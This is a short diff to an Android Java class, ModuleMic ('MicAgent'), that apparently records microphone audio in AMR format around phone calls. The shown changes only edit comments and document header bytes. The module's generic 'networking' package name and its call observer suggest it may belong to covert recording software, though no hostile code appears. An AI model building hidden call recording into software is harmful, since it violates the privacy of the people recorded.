@@ -37,9 +37,8 @@ import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
 import com.android.networking.util.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
- * The Class MicAgent. 8000KHz, 32bit
+ * The Class MicAgent. 8000KHz, 16bit
  * 
  * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
  * 
@@ -49,6 +48,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	private static final long MIC_PERIOD = 5000;
+	// #!AMR[space] 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
